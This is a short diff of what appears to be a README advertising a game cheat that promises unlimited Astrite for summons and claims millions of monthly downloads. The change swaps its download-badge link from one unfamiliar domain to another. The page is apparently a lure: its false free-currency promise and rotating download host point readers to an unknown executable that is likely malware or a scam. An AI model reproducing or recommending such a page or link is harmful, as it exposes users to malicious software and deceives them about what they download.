@@ -70,7 +70,7 @@ A: Yes — generate unlimited Astrite for summons.
 
 **Monthly downloads:** 2.5m+
 
-[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/wuwatr19)
+[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/wuwatr19)
 
 ---
 
